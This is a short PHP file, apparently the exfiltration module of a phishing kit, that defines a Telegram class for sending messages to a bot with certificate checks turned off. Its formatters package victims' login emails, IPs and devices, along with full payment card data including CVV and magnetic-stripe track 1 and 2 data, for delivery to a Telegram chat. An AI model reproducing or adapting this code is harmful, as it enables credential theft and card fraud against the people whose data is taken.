<?php
class Telegram {
    private $token;
    private $chatId;

    public function __construct($token, $chatId) {
        $this->token = $token;
        $this->chatId = $chatId;
    }

    public function kirim($pesan) {
        $url = "https://api.telegram.org/bot{$this->token}/sendMessage";
        $data = [
            'chat_id'    => $this->chatId,
            'text'       => $pesan,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $hasil = curl_exec($ch);
        curl_close($ch);
        return $hasil;
    }

    public function formatLogin($email, $ip, $ua, $bahasa) {
        return "
🔐 <b>LOGIN INFO</b>
━━━━━━━━━━━━━━━━━━━━━
📧 Email: {$email}
🌐 IP: {$ip}
🌐 Bahasa: {$bahasa}
📱 Perangkat: {$ua}
━━━━━━━━━━━━━━━━━━━━━
        ";
    }

    public function formatKartu($email, $nama, $nomor, $exp, $cvv, $track1, $track2, $alamat, $ip) {
        return "
💳 <b>VERIFICATION PAYMENT</b>
━━━━━━━━━━━━━━━━━━━━━
📧 Email: {$email}
👤 Nama di Kartu: {$nama}
🔢 Nomor Kartu: {$nomor}
📅 Expiry: {$exp}
🔒 CVV: {$cvv}
📍 Alamat: {$alamat}
🌐 IP: {$ip}
━━━━━━━━━━━━━━━━━━━━━
📋 <b>TRACK DATA</b>
T1: {$track1}
T2: {$track2}
        ";
    }
}